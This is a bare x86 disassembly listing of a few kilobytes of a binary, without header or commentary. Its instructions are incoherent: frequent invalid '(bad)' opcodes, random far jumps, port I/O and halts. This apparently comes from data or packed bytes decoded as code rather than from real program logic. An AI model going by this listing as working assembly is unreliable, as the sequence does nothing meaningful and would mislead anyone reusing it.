  40f6fa:	loope  0x40f70d
  40f6fc:	pop    ds
  40f6fd:	xor    al,0xb9
  40f6ff:	popf   
  40f700:	sub    eax,0x932fa904
  40f705:	sbb    ch,BYTE PTR [ebx-0x28cc946e]
  40f70b:	inc    esi
  40f70c:	mov    DWORD PTR [ebx],esi
  40f70e:	mov    eax,0x24b47d46
  40f713:	test   esi,eax
  40f715:	jmp    0xa2c2:0xd7a9f69
  40f71c:	repnz pop ecx
  40f71e:	and    cl,cl
  40f720:	push   cs
  40f721:	daa    
  40f722:	adc    DWORD PTR [edi-0x77],0x5a
  40f726:	loop   0x40f75b
  40f728:	mov    dh,0x1b
  40f72a:	and    ebp,DWORD PTR ds:0xbc74825f
  40f730:	xchg   edi,eax
  40f731:	sub    BYTE PTR [ebx],ch
  40f733:	mov    ds:0xb8ab43ff,al
  40f738:	mov    cs,WORD PTR [edx]
  40f73a:	xchg   edi,eax
  40f73b:	push   ebx
  40f73c:	(bad)  
  40f73d:	rcr    eax,cl
  40f73f:	test   eax,0x92f2aaee
  40f744:	mov    al,ds:0x9b19d99
  40f749:	popf   
  40f74a:	pusha  
  40f74b:	ret    0x1443
  40f74e:	stos   DWORD PTR es:[edi],eax
  40f74f:	imul   esp,eax,0xa5754b9d
  40f755:	jns    0x40f7cc
  40f757:	mov    ds:0xe17c1824,eax
  40f75c:	pop    ss
  40f75d:	mov    DWORD PTR [edx],0x96c4e539
  40f763:	add    eax,0x60a33ae0
  40f768:	lods   al,BYTE PTR ds:[esi]
  40f769:	sub    eax,0x904accb6
  40f76e:	fild   WORD PTR [eax+eiz*4+0x78784f2f]
  40f775:	cs icebp 
  40f777:	push   edx
  40f778:	add    al,BYTE PTR [ebx-0x3f]
  40f77b:	test   al,dh
  40f77d:	xor    dh,BYTE PTR [edi+0x43]
  40f780:	xor    ecx,edi
  40f782:	xchg   edx,eax
  40f783:	outs   dx,DWORD PTR ds:[esi]
  40f784:	sbb    al,0x65
  40f786:	xor    eax,0xb19244d1
  40f78b:	push   0xc
  40f78d:	and    DWORD PTR [ebx-0x35dc80e5],eax
  40f793:	sbb    al,0x8d
  40f795:	or     DWORD PTR [ebp+0x666f4cea],ebx
  40f79b:	mov    ah,0x39
  40f79d:	xor    BYTE PTR [ebx+0x41],cl
  40f7a0:	inc    edx
  40f7a1:	inc    ebx
  40f7a2:	les    esp,FWORD PTR [eax+0x55]
  40f7a5:	push   ss
  40f7a6:	push   eax
  40f7a7:	jo     0x40f80c
  40f7a9:	outs   dx,DWORD PTR ds:[esi]
  40f7aa:	test   BYTE PTR [esp+esi*1-0xd2488e6],0xa
  40f7b2:	bnd jnp 0x40f82d
  40f7b5:	inc    ecx
  40f7b6:	cwde   
  40f7b7:	and    al,0x39
  40f7b9:	add    al,0xe9
  40f7bb:	xor    edi,DWORD PTR [eax]
  40f7bd:	dec    ebx
  40f7be:	or     BYTE PTR [ecx-0x61db437d],0xd3
  40f7c5:	add    ecx,edi
  40f7c7:	push   ss
  40f7c8:	aam    0xa8
  40f7ca:	pop    esp
  40f7cb:	dec    esi
  40f7cc:	pop    esp
  40f7cd:	inc    ebx
  40f7ce:	push   edx
  40f7cf:	jp     0x40f764
  40f7d1:	daa    
  40f7d2:	arpl   WORD PTR [esp+ecx*8],bx
  40f7d5:	in     eax,dx
  40f7d6:	popa   
  40f7d7:	cdq    
  40f7d8:	(bad)  
  40f7d9:	call   0x157ae767
  40f7de:	pop    edi
  40f7df:	cmp    al,0x79
  40f7e1:	stos   BYTE PTR es:[edi],al
  40f7e2:	imul   eax,DWORD PTR [edx],0xfe480ea1
  40f7e8:	test   DWORD PTR [eax-0x5],eax
  40f7eb:	into   
  40f7ec:	(bad)  
  40f7ed:	and    eax,0xb7bf0403
  40f7f2:	lods   eax,DWORD PTR ds:[esi]
  40f7f3:	mov    ds:0x54a41aaf,eax
  40f7f8:	ss es add eax,0x115aaeb3
  40f7ff:	mov    dh,0xb6
  40f801:	pusha  
  40f802:	cmc    
  40f803:	std    
  40f804:	adc    edx,DWORD PTR [edi-0x63]
  40f807:	sub    al,0x9e
  40f809:	mov    cl,0x7c
  40f80b:	push   ebx
  40f80c:	imul   eax,ecx,0xa1c8d302
  40f812:	inc    edi
  40f813:	push   0x27
  40f815:	inc    ebx
  40f816:	addr16 jmp 0x4b6d6aca
  40f81c:	push   es
  40f81d:	mov    ds:0x74e311b8,eax
  40f822:	scas   eax,DWORD PTR es:[edi]
  40f823:	cmp    eax,0xd969ad4d
  40f828:	jmp    0x40f851
  40f82a:	(bad)  
  40f82c:	jae    0x40f7db
  40f82e:	das    
  40f82f:	loope  0x40f846
  40f831:	test   DWORD PTR [ecx-0x54],0x13146398
  40f838:	dec    esp
  40f839:	cs jns 0x40f847
  40f83c:	ja     0x40f845
  40f83e:	xlat   BYTE PTR ds:[ebx]
  40f83f:	jmp    0xeca3:0xfe3818f8
  40f846:	clc    
  40f847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f848:	clc    
  40f849:	lea    eax,[eax-0x9]
  40f84c:	call   0xbfe53ef9
  40f851:	mov    eax,0x6f06980f
  40f856:	lods   al,BYTE PTR ds:[esi]
  40f857:	inc    esi
  40f858:	in     eax,0x53
  40f85a:	hlt    
  40f85b:	or     eax,0xa8727443
  40f860:	mov    al,BYTE PTR [edi+edx*2]
  40f863:	int3   
  40f864:	mov    bh,0xf7
  40f866:	ins    DWORD PTR es:[edi],dx
  40f867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f868:	xor    dh,dl
  40f86a:	adc    DWORD PTR [ebp-0x9],0x4db16d9c
  40f871:	jl     0x40f85b
  40f873:	sahf   
  40f874:	(bad)  
  40f876:	push   ebx
  40f877:	push   edi
  40f878:	jb     0x40f891
  40f87a:	test   BYTE PTR [edx],0xd4
  40f87d:	pop    ebp
  40f87e:	mov    bl,0x96
  40f880:	mov    esi,0x8bbc661
  40f885:	out    dx,eax
  40f886:	test   eax,0xc72e9be
  40f88b:	pop    ecx
  40f88c:	adc    ebp,DWORD PTR [edx+eiz*1-0x278ec57b]
  40f893:	hlt    
  40f894:	popf   
  40f895:	neg    eax
  40f897:	pusha  
  40f898:	rcl    BYTE PTR [ebx],0xa9
  40f89b:	cmc    
  40f89c:	cmp    BYTE PTR [esp+edi*1-0x1a],ch
  40f8a0:	adc    al,0x8a
  40f8a2:	mov    ds:0x17ae7c9,al
  40f8a7:	add    edx,DWORD PTR [ebp-0x7f924823]
  40f8ad:	xchg   esi,eax
  40f8ae:	xor    dh,BYTE PTR [esi]
  40f8b0:	stos   BYTE PTR es:[edi],al
  40f8b1:	retf   
  40f8b2:	add    ecx,DWORD PTR [ebp-0x34]
  40f8b5:	(bad)
  40f8b9:	mov    eax,0xf9a5010
  40f8bf:	mov    edx,0x35d2d34f
  40f8c4:	jae    0x40f929
  40f8c6:	fs aaa 
  40f8c8:	mov    esp,0x77a8e438
  40f8cd:	push   ebp
  40f8ce:	ds out 0x42,al
  40f8d1:	lock sbb BYTE PTR ds:0x9c3d06b8,ah
  40f8d8:	jne    0x40f8bc
  40f8da:	aas    
  40f8db:	lods   eax,DWORD PTR ds:[esi]
  40f8dc:	cmc    
  40f8dd:	mov    ss,ebx
  40f8df:	imul   esi,DWORD PTR ds:0xa95befaa,0x41
  40f8e6:	pop    edx
  40f8e7:	fst    QWORD PTR [edi-0x3f84a074]
  40f8ed:	pop    esi
  40f8ee:	scas   al,BYTE PTR es:[edi]
  40f8ef:	mov    DWORD PTR [edx],0x80d49d40
  40f8f5:	inc    esi
  40f8f6:	cs xchg edx,eax
  40f8f8:	mov    edx,0xb0f400c7
  40f8fd:	jmp    0x40f8f7
  40f8ff:	or     ecx,esi
  40f901:	or     BYTE PTR [esi+0x59],ah
  40f904:	out    0xda,al
  40f906:	out    dx,eax
  40f907:	push   esp
  40f908:	iret   
  40f909:	ja     0x40f950
  40f90b:	test   eax,0x6d553aa1
  40f910:	mov    esi,0x2087cd8
  40f915:	hlt    
  40f916:	or     DWORD PTR [edx-0x31e774fe],ebx
  40f91c:	sbb    al,0x8e
  40f91e:	aad    0x1f
  40f920:	fdiv   DWORD PTR [ebx+ebx*2+0x32]
  40f924:	loop   0x40f93a
  40f926:	pop    eax
  40f927:	cdq    
  40f928:	jo     0x40f915
  40f92a:	cmp    al,0x89
  40f92c:	sbb    dl,ah
  40f92e:	sub    BYTE PTR [ecx+0x6a943856],dh
  40f934:	dec    esp
  40f935:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f936:	add    BYTE PTR [edi+0x673d1a3d],bh
  40f93c:	into   
  40f93d:	inc    esp
  40f93e:	daa    
  40f93f:	inc    ebx
  40f940:	shl    dl,0x2a
  40f943:	add    ebp,edx
  40f945:	fst    QWORD PTR [edx-0x1b]
  40f948:	imul   esp,DWORD PTR [ecx+0x2c],0xffffffae
  40f94c:	push   0xffffff9e
  40f94e:	sahf   
  40f94f:	(bad)  [esi+0x4dd7e616]
  40f955:	sbb    DWORD PTR [ecx],ecx
  40f957:	lods   al,BYTE PTR ds:[esi]
  40f958:	jne    0x40f905
  40f95a:	xchg   ebx,eax
  40f95b:	dec    esi
  40f95c:	out    0xca,al
  40f95e:	pop    es
  40f95f:	mov    ds:0x78d190f4,eax
  40f964:	xor    esp,0x16e18762
  40f96a:	sbb    eax,0x42552764
  40f96f:	adc    dh,BYTE PTR [ebx+0x7c]
  40f972:	or     ebx,ebp
  40f974:	cs cmp al,0x88
  40f977:	iret   
  40f978:	ret    0x399b
  40f97b:	inc    esi
  40f97c:	sbb    esp,DWORD PTR [esi-0x21]
  40f97f:	push   esi
  40f980:	cmp    BYTE PTR [ebx+0x5],0x87
  40f984:	dec    edx
  40f985:	mov    cl,0x39
  40f987:	sbb    DWORD PTR [eax-0x3d],edi
  40f98a:	les    edx,FWORD PTR [ecx]
  40f98c:	sti    
  40f98d:	push   ebp
  40f98e:	mov    al,ds:0xb3789467
  40f993:	jl     0x40fa03
  40f995:	cs popf 
  40f997:	mov    bh,0xc
  40f999:	iret   
  40f99a:	mov    ds:0xbb6b93f2,al
  40f99f:	loop   0x40f9b7
  40f9a1:	js     0x40f9e9
  40f9a3:	jae    0x40f9ea
  40f9a5:	jle    0x40f964
  40f9a7:	popf   
  40f9a8:	jmp    ebx
  40f9aa:	idiv   DWORD PTR [ebx]
  40f9ac:	shl    bh,cl
  40f9ae:	mov    ebx,0x51fb1b02
  40f9b3:	xchg   ebx,eax
  40f9b4:	jp     0x40fa0c
  40f9b6:	int3   
  40f9b7:	push   es
  40f9b8:	jnp    0x40fa27
  40f9ba:	imul   ecx,DWORD PTR [ebp-0x4a2be74a],0xffffffde
  40f9c1:	aaa    
  40f9c2:	pop    ds
  40f9c3:	(bad)  
  40f9c4:	int3   
  40f9c5:	ins    DWORD PTR es:[edi],dx
  40f9c6:	fistp  QWORD PTR [ebx]
  40f9c8:	scas   eax,DWORD PTR es:[edi]
  40f9c9:	in     eax,0x4
  40f9cb:	jl     0x40fa15
  40f9cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9ce:	stos   DWORD PTR es:[edi],eax
  40f9cf:	mov    ds:0xce5b141d,eax
  40f9d4:	ret    0x73bd
  40f9d7:	ds adc eax,0x1201fe7c
  40f9dd:	data16 jmp 0x40f992
  40f9e0:	sub    eax,DWORD PTR [esi-0x62e5d8a7]
  40f9e6:	jg     0x40f9a3
  40f9e8:	out    dx,al
  40f9e9:	sbb    DWORD PTR [ebp+0x5d3e7b52],0xffffff82
  40f9f0:	pop    esi
  40f9f1:	sub    al,BYTE PTR [esi+0x75831547]
  40f9f7:	fld    QWORD PTR ds:0x5979df7a
  40f9fd:	mov    ah,0x10
  40f9ff:	jmp    0x54411336
  40fa04:	jbe    0x40fa55
  40fa06:	push   0x73dc5f33
  40fa0b:	(bad)  
  40fa0c:	pop    eax
  40fa0d:	push   ds
  40fa0e:	arpl   WORD PTR [ebx],bx
  40fa10:	mov    esi,0xc34f0e88
  40fa15:	js     0x40fa37
  40fa17:	xchg   ebp,eax
  40fa18:	mov    al,0x5b
  40fa1a:	sti    
  40fa1b:	stos   BYTE PTR es:[edi],al
  40fa1c:	jae    0x40fa89
  40fa1e:	fs adc edi,eax
  40fa21:	or     edx,esp
  40fa23:	pop    ecx
  40fa24:	and    esi,DWORD PTR [ecx-0x2f423d8f]
  40fa2a:	dec    ecx
  40fa2b:	imul   edi,DWORD PTR [edx-0x499fec18],0x9c89795a
  40fa35:	lock inc edx
  40fa37:	mov    edx,0x80572500
  40fa3c:	dec    edi
  40fa3d:	retf   
  40fa3e:	mov    cl,0xd5
  40fa40:	fwait
  40fa41:	lea    ebx,cs:[ecx+0x751e183d]
  40fa48:	(bad)  
  40fa49:	xchg   edx,eax
  40fa4a:	mov    ds:0x185d3456,al
  40fa4f:	push   esi
  40fa50:	cli    
  40fa51:	ds cmc 
  40fa53:	pop    esi
  40fa54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa55:	ss push ebx
  40fa57:	xor    al,0x40
  40fa59:	adc    eax,0xfa4c3b07
  40fa5e:	sub    bh,al
  40fa60:	mov    bh,0x9b
  40fa62:	inc    ebx
  40fa63:	mov    ebx,0x196ca33d
  40fa68:	lods   eax,DWORD PTR ds:[esi]
  40fa69:	out    0x34,al
  40fa6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa6c:	int3   
  40fa6d:	enter  0xa73b,0x55
  40fa71:	and    eax,0xc16883b3
  40fa76:	inc    edx
  40fa77:	mov    ecx,0x4ad2aab0
  40fa7c:	cmc    
  40fa7d:	push   cs
  40fa7e:	fld    DWORD PTR [eax+0x313244c]
  40fa84:	hlt    
  40fa85:	enter  0x8db1,0x8f
  40fa89:	mov    ah,0xa3
  40fa8b:	jg     0x40fb01
  40fa8d:	or     dh,BYTE PTR [ebp-0x1c]
  40fa90:	or     eax,0x29e89bc
  40fa95:	pop    ss
  40fa96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa97:	xchg   ecx,eax
  40fa98:	pop    edx
  40fa99:	in     al,0x83
  40fa9b:	mov    al,0xcc
  40fa9d:	push   ss
  40fa9e:	jb     0x40fabf
  40faa0:	sbb    BYTE PTR [edx],0x1c
  40faa3:	cld    
  40faa4:	ins    DWORD PTR es:[edi],dx
  40faa5:	cld    
  40faa6:	lods   al,BYTE PTR ds:[esi]
  40faa7:	push   ecx
  40faa8:	sbb    esp,DWORD PTR [eax-0x8882ba4]
  40faae:	xchg   edi,eax
  40faaf:	inc    BYTE PTR [ebp+0xf]
  40fab2:	and    eax,0x68fd55aa
  40fab7:	pop    ebx
  40fab8:	and    bh,BYTE PTR [edi-0x38]
  40fabb:	nop
  40fabc:	push   ds
  40fabd:	out    dx,al
  40fabe:	mov    dh,al
  40fac0:	out    0x17,eax
  40fac2:	xchg   ebx,eax
  40fac3:	call   0x77438068
  40fac8:	dec    ecx
  40fac9:	mov    ebp,0xb854691b
  40face:	push   ds
  40facf:	es loope 0x40faa9
  40fad2:	xchg   esi,eax
  40fad3:	ret    
  40fad4:	icebp  
  40fad5:	and    cl,bh
  40fad7:	das    
  40fad8:	clc    
  40fad9:	retf   
  40fada:	jmp    0xf371:0x675c2da6
  40fae1:	xlat   BYTE PTR ds:[ebx]
  40fae2:	sub    ebx,DWORD PTR [eax]
  40fae4:	mov    dl,0xfe
  40fae6:	sbb    eax,0x5238158f
  40faeb:	ror    DWORD PTR [edi+0x58],0xc7
  40faef:	or     DWORD PTR [eax+0x30],ebp
  40faf2:	imul   esi,esi,0xbc6688dc
  40faf8:	in     al,dx
  40faf9:	out    0xb2,eax
  40fafb:	pop    esi
  40fafc:	icebp  
  40fafd:	rcr    BYTE PTR [ebx+ecx*1+0x52],0xe2
  40fb02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb03:	aaa    
  40fb04:	int3   
  40fb05:	dec    esi
  40fb06:	xchg   ecx,eax
  40fb07:	dec    edx
  40fb08:	sub    eax,0x48443975
  40fb0d:	ror    eax,cl
  40fb0f:	add    dh,BYTE PTR [edx+0x2b]
  40fb12:	ret    
  40fb13:	jg     0x40fb5f
  40fb15:	inc    eax
  40fb16:	or     cl,al
  40fb18:	test   eax,0x2b3cd2b3
  40fb1d:	mov    esi,0x7259a7aa
  40fb22:	sub    esi,0x23d6e680
  40fb28:	mov    ah,0xe1
  40fb2a:	xchg   DWORD PTR [ebx+edi*1],edx
  40fb2d:	mov    bl,0x78
  40fb2f:	pop    ebx
  40fb30:	mov    BYTE PTR [edi-0x2d],0x9b
  40fb34:	xchg   edi,eax
  40fb35:	js     0x40fb82
  40fb37:	sbb    bl,BYTE PTR [esi+0x529f6594]
  40fb3d:	sar    DWORD PTR ds:0xd14b7c1f,0x38
  40fb44:	add    eax,0xc09fc4b9
  40fb49:	lea    esi,[esi+0x54caadde]
  40fb4f:	adc    al,0xeb
  40fb51:	out    dx,al
  40fb52:	mov    ecx,0xa70b0181
  40fb57:	xor    BYTE PTR [ebx+0x7e475f0e],ah
  40fb5d:	cld    
  40fb5e:	xchg   esi,eax
  40fb5f:	dec    esp
  40fb60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb61:	shr    BYTE PTR ds:0x53f16f34,0x22
  40fb68:	jns    0x40fb6b
  40fb6a:	test   eax,0x68ea4e5d
  40fb6f:	jmp    0xb34e:0xfc942f2e
  40fb76:	sub    DWORD PTR [eax],edx
  40fb78:	cs jg  0x40fb79
  40fb7b:	loop   0x40fb6f
  40fb7d:	sub    bh,BYTE PTR [esi]
  40fb7f:	xor    DWORD PTR [edx-0x54],ecx
  40fb82:	and    eax,0xca3201c
  40fb87:	popa   
  40fb88:	xchg   edx,eax
  40fb89:	addr16 jae 0x40fbc5
  40fb8c:	call   FWORD PTR [edx-0x1e739256]
  40fb92:	aad    0xc2
  40fb94:	in     eax,dx
  40fb95:	jmp    0x40fb89
  40fb97:	push   esp
  40fb98:	fs add eax,0x2028038d
  40fb9e:	sbb    eax,0x3f15ac84
  40fba3:	pop    edx
  40fba4:	in     eax,dx
  40fba5:	pop    edi
  40fba6:	popa   
  40fba7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fba8:	in     eax,dx
  40fba9:	adc    dl,BYTE PTR [esi-0x121e04bc]
  40fbaf:	sub    DWORD PTR [ebx+0xd6eb2c5],0x6fa040fc
  40fbb9:	and    ecx,DWORD PTR [esi]
  40fbbb:	scas   eax,DWORD PTR es:[edi]
  40fbbc:	inc    edi
  40fbbd:	or     eax,esp
  40fbbf:	or     cl,cl
  40fbc1:	or     DWORD PTR [edx-0x27],ebp
  40fbc4:	jl     0x40fbed
  40fbc6:	jo     0x40fc0c
  40fbc8:	cmp    edi,esp
  40fbca:	call   0xea52e408
  40fbcf:	ja     0x40fbb7
  40fbd1:	pop    edi
  40fbd2:	and    DWORD PTR [ecx+0xe],edx
  40fbd5:	imul   esp,DWORD PTR [edx-0x4c4e4dc5],0x35
  40fbdc:	or     DWORD PTR [edi+edi*8],eax
  40fbdf:	mov    ?,esp
  40fbe1:	or     DWORD PTR [ebp-0x6e7f05f7],esi
  40fbe7:	and    BYTE PTR [esi],0x9f
  40fbea:	xor    al,0x11
  40fbec:	jnp    0x40fc1c
  40fbee:	mov    ebx,DWORD PTR [edi-0x6e]
  40fbf1:	add    al,BYTE PTR [edx]
  40fbf3:	out    dx,al
  40fbf4:	dec    esp
  40fbf5:	jnp    0x40fbfc
  40fbf7:	data16 ins BYTE PTR es:[edi],dx
  40fbf9:	in     al,0x99
  40fbfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbfc:	fs sub edx,edx
  40fbff:	sbb    bl,dh
  40fc01:	push   cs
  40fc02:	jge    0x40fc74
  40fc04:	inc    eax
  40fc05:	mov    ch,0xb2
  40fc07:	ror    edx,cl
  40fc09:	inc    esp
  40fc0a:	ds int 0xe
  40fc0d:	popa   
  40fc0e:	sub    al,0x31
  40fc10:	jns    0x40fc7c
  40fc12:	adc    al,BYTE PTR [edi+0x3521122]
  40fc18:	stc    
  40fc19:	rcl    esp,1
  40fc1b:	test   al,0xda
  40fc1d:	jmp    0x40fbcb
  40fc1f:	imul   edx,edx,0x4f
  40fc22:	pop    edx
  40fc23:	inc    ebp
  40fc24:	mov    bh,ch
  40fc26:	mov    edx,0xc8f61466
  40fc2b:	and    al,0x93
  40fc2d:	xchg   al,ch
  40fc2f:	inc    esp
  40fc30:	fs cmp ebp,ecx
  40fc33:	hlt    
  40fc34:	out    dx,eax
  40fc35:	push   ds
  40fc36:	loopne 0x40fbfb
  40fc38:	xor    al,0xd1
  40fc3a:	leave  
  40fc3b:	add    DWORD PTR [edi+eiz*4+0x2f],esp
  40fc3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc40:	cmp    al,0x6b
  40fc42:	mov    ebx,ds
  40fc44:	or     esp,DWORD PTR [ebx+0x7d]
  40fc47:	call   0xd3805b4
  40fc4c:	in     al,dx
  40fc4d:	push   0xab9de9d0
  40fc52:	add    dl,bl
  40fc54:	cmc    
  40fc55:	sub    BYTE PTR [ebp+0x794be349],bh
  40fc5b:	mov    al,ds:0x620bb4b2
  40fc60:	jno    0x40fcca
  40fc62:	add    eax,0x41fd7e55
  40fc67:	push   esp
  40fc68:	fwait
  40fc69:	rol    esi,0xfe
  40fc6c:	cmp    al,0x10
  40fc6e:	and    al,0x16
  40fc70:	cmp    eax,0xce0014ee
  40fc75:	or     BYTE PTR [esi],al
  40fc77:	xor    dh,BYTE PTR [ecx-0x1d]
  40fc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc7b:	inc    esi
  40fc7c:	cmp    ecx,esp
  40fc7e:	es loop 0x40fc7a
  40fc81:	out    0xfa,al
  40fc83:	jmp    0xc9c20aa4
  40fc88:	aaa    
  40fc89:	pop    edx
  40fc8a:	js     0x40fcae
  40fc8c:	jbe    0x40fd0d
  40fc8e:	lock xor eax,0xfcd5a8d8
  40fc94:	bound  edx,QWORD PTR [eax+0x2d]
  40fc97:	imul   ebp,DWORD PTR [edi+ecx*4],0x8dc4b936
  40fc9e:	cdq    
  40fc9f:	mov    ah,0xc7
  40fca1:	test   BYTE PTR [bp+si+0x62da],dl
  40fca6:	add    eax,0xa120c64e
  40fcab:	cdq    
  40fcac:	popa   
  40fcad:	hlt    
  40fcae:	jle    0x40fcb5
  40fcb0:	mov    bl,0x58
  40fcb2:	mov    bh,0x6c
  40fcb4:	cmp    al,0xc
  40fcb6:	jb     0x40fce5
  40fcb8:	pop    es
  40fcb9:	or     bl,BYTE PTR [esi-0x4aa72e11]
  40fcbf:	mov    esi,0x7bc74e14
  40fcc4:	loope  0x40fcd2
  40fcc6:	mov    edx,0xdc78d67a
  40fccb:	jl     0x40fd30
  40fccd:	outs   dx,DWORD PTR ds:[esi]
  40fcce:	sahf   
  40fccf:	inc    edi
  40fcd0:	add    bl,BYTE PTR [ecx+ebx*8]
  40fcd3:	jnp    0x40fcba
  40fcd5:	and    BYTE PTR ds:0x91b695f4,dl
  40fcdb:	inc    eax
  40fcdc:	shl    DWORD PTR [edi],cl
  40fcde:	pop    ds
  40fcdf:	jb     0x40fd02
  40fce1:	ins    DWORD PTR es:[edi],dx
  40fce2:	and    al,0xd6
  40fce4:	jnp    0x40fd3e
  40fce6:	and    bh,BYTE PTR [edx-0x4d856db5]
  40fcec:	mov    ch,0xf6
  40fcee:	in     eax,dx
  40fcef:	adc    edi,DWORD PTR [ebx]
  40fcf1:	(bad)  
  40fcf2:	leave  
  40fcf3:	rcr    BYTE PTR [edi+ebp*4+0x15],1
  40fcf7:	mov    es,WORD PTR [ebx]
  40fcf9:	das    
  40fcfa:	pop    eax
  40fcfb:	jae    0x40fc9c
  40fcfd:	mov    bh,bh
  40fcff:	mov    bl,0xbe
  40fd01:	ds out 0x3,al
  40fd04:	jb     0x40fcd2
  40fd06:	jl     0x40fd70
  40fd08:	bound  ebx,QWORD PTR [eax+eiz*4-0x6e]
  40fd0c:	imul   ecx,esi,0x9bfb0000
  40fd12:	inc    edi
  40fd13:	mov    ebp,DWORD PTR [esi+0x1a878b53]
  40fd19:	fld    TBYTE PTR [edi-0x2d33dc05]
  40fd1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd20:	std    
  40fd21:	dec    ecx
  40fd22:	cmp    al,0x84
  40fd24:	not    DWORD PTR [edi-0x30]
  40fd27:	repnz scas al,BYTE PTR es:[edi]
  40fd29:	cs dec ebp
  40fd2b:	gs mov bl,0xf4
  40fd2e:	mov    al,ds:0x2bc26ffc
  40fd33:	nop
  40fd34:	mov    cl,0xb9
  40fd36:	pop    ebx
  40fd37:	or     BYTE PTR [esi-0x20603387],dh
  40fd3d:	push   ecx
  40fd3e:	push   esi
  40fd3f:	push   edi
  40fd40:	jmp    0x963f295c
  40fd45:	scas   al,BYTE PTR es:[edi]
  40fd46:	lea    ecx,[ecx-0x4d]
  40fd49:	out    0x85,al
  40fd4b:	mov    es,WORD PTR [edx+ecx*4]
  40fd4e:	pop    eax
  40fd4f:	aad    0x95
  40fd51:	jge    0x40fd66
  40fd53:	ins    BYTE PTR es:[edi],dx
  40fd54:	out    dx,eax
  40fd55:	arpl   WORD PTR [ebx-0x48],bx
  40fd58:	test   al,0x66
  40fd5a:	xor    BYTE PTR [edx-0x77812131],bh
  40fd60:	call   0x5ad6:0x4b68c0d4
  40fd67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd68:	adc    al,0xe0
  40fd6a:	sub    ch,BYTE PTR [edi]
  40fd6c:	pushf  
  40fd6d:	in     eax,dx
  40fd6e:	xor    BYTE PTR [eax+0x5c897878],ah
  40fd74:	mov    edi,0x4dc6e928
  40fd79:	inc    esi
  40fd7a:	xchg   edi,eax
  40fd7b:	and    al,ch
  40fd7d:	mov    eax,0x4982a237
  40fd82:	out    dx,al
  40fd83:	popa   
  40fd84:	mov    ebx,0x9e00b5f3
  40fd89:	xchg   ebp,eax
  40fd8a:	es inc esp
  40fd8c:	pop    DWORD PTR ds:0xcde76dff
  40fd92:	jnp    0x40fd63
  40fd94:	dec    ebx
  40fd95:	mov    ds:0xfab6d5d7,eax
  40fd9a:	les    ebp,FWORD PTR [edi]
  40fd9c:	cdq    
  40fd9d:	retf   
  40fd9e:	inc    eax
  40fd9f:	push   ss
  40fda0:	(bad)  
  40fda1:	mov    ecx,0xfdbacc5
  40fda6:	repnz add eax,0xd59c3c6d
  40fdac:	nop
  40fdad:	pop    esi
  40fdae:	push   0xa9c2541b
  40fdb3:	fstp   DWORD PTR [ecx+0x72]
  40fdb6:	dec    ebp
  40fdb7:	out    0x1e,eax
  40fdb9:	mov    al,ds:0xd4a68383
  40fdbe:	dec    ecx
  40fdbf:	fsub   st,st(3)
  40fdc1:	retf   0x2728
  40fdc4:	mov    ?,esp
  40fdc6:	xor    eax,0xbcae6257
  40fdcb:	scas   al,BYTE PTR es:[edi]
  40fdcc:	int    0x8b
  40fdce:	(bad)  
  40fdcf:	in     eax,0x5a
  40fdd1:	lods   al,BYTE PTR ds:[esi]
  40fdd2:	sbb    esi,esp
  40fdd4:	or     al,0x7d
  40fdd6:	test   al,0xab
  40fdd8:	daa    
  40fdd9:	pushf  
  40fdda:	xor    BYTE PTR [ebx-0x4],bh
  40fddd:	stc    
  40fdde:	addr16 cld 
  40fde0:	cmp    ecx,DWORD PTR [edi+edx*8-0x4b]
  40fde4:	repz gs lahf 
  40fde7:	dec    edi
  40fde8:	jle    0x40fe46
  40fdea:	jnp    0x40fddd
  40fdec:	aad    0xc
  40fdee:	dec    ecx
  40fdef:	(bad)  
  40fdf0:	dec    esp
  40fdf1:	leave  
  40fdf2:	cmp    cl,BYTE PTR [edi+ebx*2]
  40fdf5:	clc    
  40fdf6:	sbb    BYTE PTR [edx],bl
  40fdf8:	jbe    0x40fe0a
  40fdfa:	add    esi,eax
  40fdfc:	call   0xc964:0xb96b372b
  40fe03:	and    dl,ch
  40fe05:	add    al,0xb5
  40fe07:	sub    ch,bl
  40fe09:	sbb    al,ch
  40fe0b:	xor    BYTE PTR [esi-0x1f166cc],ah
  40fe11:	xchg   ecx,eax
  40fe12:	inc    esi
  40fe13:	rol    DWORD PTR [eax+0x73d3451f],cl
  40fe19:	shl    ebx,1
  40fe1b:	repnz sahf 
  40fe1d:	in     eax,0xad
  40fe1f:	pop    ebp
  40fe20:	adc    BYTE PTR [eax+ebx*1+0x2e],bh
  40fe24:	or     al,0x6d
  40fe26:	dec    edi
  40fe27:	sub    eax,0x8c2e1b17
  40fe2c:	push   edi
  40fe2d:	hlt    
  40fe2e:	cmc    
  40fe2f:	jge    0x40fe3a
  40fe31:	mov    edi,0xad54d6b3
  40fe36:	hlt    
  40fe37:	lea    eax,[edx+edi*2+0x46]
  40fe3b:	es sahf 
  40fe3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe3e:	aad    0xc2
  40fe40:	jmp    0x3826:0x872b8d45
  40fe47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe48:	xchg   edi,eax
  40fe49:	retf   
  40fe4a:	sbb    esi,DWORD PTR [edx+0x4c59dac5]
  40fe50:	aam    0xbe
  40fe52:	push   0x1
  40fe54:	(bad)  
  40fe55:	pusha  
  40fe56:	loopne 0x40fe26
  40fe58:	fst    QWORD PTR ds:0x80cfc93c
  40fe5e:	adc    BYTE PTR [eax-0x2],bl
  40fe61:	cmp    eax,0x484665ed
  40fe67:	shl    BYTE PTR ds:0xd7495c32,0x58
  40fe6e:	mov    al,ds:0xabaae011
  40fe73:	dec    ebp
